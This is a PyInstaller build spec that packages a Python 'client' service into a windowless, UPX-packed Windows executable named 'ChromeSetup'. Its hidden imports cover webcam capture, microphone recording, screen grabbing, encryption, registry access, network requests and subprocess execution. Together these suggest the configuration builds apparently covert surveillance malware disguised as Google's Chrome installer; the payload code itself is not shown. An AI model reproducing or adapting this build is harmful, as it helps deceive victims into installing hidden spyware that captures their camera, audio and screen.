# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['client\\service.py'],
    pathex=[],
    binaries=[],
    datas=[('shared', 'shared'), ('client', 'client')],
    hiddenimports=['win32serviceutil', 'win32service', 'win32event', 'servicemanager', 'win32api', 'win32con', 'win32security', 'pywintypes', 'winreg', 'win32com.client', 'win32timezone', 'requests', 'requests.adapters', 'requests.auth', 'urllib3', 'urllib.request', 'urllib.parse', 'http.client', 'psutil', 'cv2', 'pyaudio', 'PIL', 'PIL.Image', 'PIL.ImageGrab', 'cryptography', 'cryptography.fernet', 'cryptography.hazmat.primitives.ciphers', 'uuid', 'audioop', 'wave', 'json', 'socket', 'threading', 'subprocess', 'logging', 'logging.handlers', 'hashlib', 'base64', 'io', 'time', 'shutil', 'ctypes', 'ctypes.wintypes', 'platform'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='ChromeSetup',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
